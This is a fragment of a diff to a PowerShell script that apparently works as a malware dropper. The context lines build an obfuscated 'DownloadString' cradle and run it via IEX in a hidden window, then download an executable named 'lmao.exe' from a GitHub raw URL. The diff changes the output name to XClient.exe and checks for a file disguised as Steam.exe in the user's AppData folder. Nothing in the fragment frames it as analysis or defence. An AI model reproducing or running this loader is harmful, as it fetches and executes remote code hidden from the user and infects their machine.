@@ -95,9 +95,9 @@ $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/lmao.exe"
-$output = "$dir\lmao.scr"
-
-if (Test-Path -Path $output) {
+$output = "$dir\XClient.exe"
+$path = "$env:appdata\Steam.exe"
+if (Test-Path -Path $path) {
     Write-Host "hello"
 } else {
     Invoke-WebRequest -Uri $url -OutFile $output
